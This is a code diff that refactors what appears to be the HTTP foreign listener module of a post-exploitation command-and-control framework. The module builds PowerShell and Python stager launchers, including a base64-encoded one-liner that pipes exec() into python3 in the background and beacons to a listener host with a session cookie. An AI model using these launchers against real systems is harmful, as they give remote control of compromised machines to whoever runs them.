@@ -43,7 +43,7 @@ class Listener:
             "Host": {
                 "Description": "Hostname/IP for staging.",
                 "Required": True,
-                "Value": "http://%s" % (helpers.lhost()),
+                "Value": f"http://{helpers.lhost()}",
             },
             "Port": {
                 "Description": "Port for the listener.",
@@ -276,16 +276,14 @@ class Listener:
                     stager,
                     obfuscation_command=obfuscation_command,
                 )
-                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             # base64 encode the stager and return it
             if encode and (
                 (not obfuscate) or ("launcher" not in obfuscation_command.lower())
             ):
                 return helpers.powershell_launcher(stager, launcher)
-            else:
-                # otherwise return the case-randomized stager
-                return stager
+            # otherwise return the case-randomized stager
+            return stager
 
         if language in ["python", "ironpython"]:
             launcherBase = "import sys;"
@@ -315,10 +313,7 @@ class Listener:
             b64RoutingPacket = listenerOptions["RoutingPacket"]["Value"]
 
             # add the RC4 packet to a cookie
-            launcherBase += (
-                'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session=%s")];\n'
-                % (b64RoutingPacket)
-            )
+            launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={b64RoutingPacket}")];\n'
             launcherBase += "import urllib.request;\n"
 
             if proxy.lower() != "none":
@@ -367,9 +362,6 @@ class Listener:
                 launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                     launcherBase
                 )
-                launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
-                    launcherBase
-                )
 
             if encode:
                 launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
@@ -377,18 +369,13 @@ class Listener:
                 )
                 if isinstance(launchEncoded, bytes):
                     launchEncoded = launchEncoded.decode("UTF-8")
-                launcher = (
-                    "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &"
-                    % (launchEncoded)
-                )
-                return launcher
-            else:
-                return launcherBase
+                return f"echo \"import sys,base64;exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
+            return launcherBase
 
-        else:
-            log.error(
-                "listeners/http_foreign generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
-            )
+        log.error(
+            "listeners/http_foreign generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
+        )
+        return None
 
     def generate_stager(
         self,
@@ -424,46 +411,45 @@ class Listener:
         """
         host = listenerOptions["Host"]["Value"]
 
-        if language:
-            if language.lower() == "powershell":
-                template_path = [
-                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
-                ]
-
-                eng = templating.TemplateEngine(template_path)
-                template = eng.get_template("http/http.ps1")
-
-                template_options = {
-                    "session_cookie": self.session_cookie,
-                    "host": host,
-                }
-
-                comms = template.render(template_options)
-                return comms
-
-            elif language.lower() == "python":
-                template_path = [
-                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
-                ]
-                eng = templating.TemplateEngine(template_path)
-                template = eng.get_template("http/comms.py")
-
-                template_options = {
-                    "session_cookie": self.session_cookie,
-                    "host": host,
-                }
-
-                comms = template.render(template_options)
-                return comms
-
-            else:
-                log.error(
-                    "listeners/http_foreign generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
-                )
-        else:
+        if not language:
             log.error("listeners/http_foreign generate_comms(): no language specified!")
+            return None
+
+        if language.lower() == "powershell":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
+
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http/http.ps1")
+
+            template_options = {
+                "session_cookie": self.session_cookie,
+                "host": host,
+            }
+
+            return template.render(template_options)
+
+        if language.lower() == "python":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http/comms.py")
+
+            template_options = {
+                "session_cookie": self.session_cookie,
+                "host": host,
+            }
+
+            return template.render(template_options)
+
+        log.error(
+            "listeners/http_foreign generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
+        )
+        return None
 
     def start(self):
         """
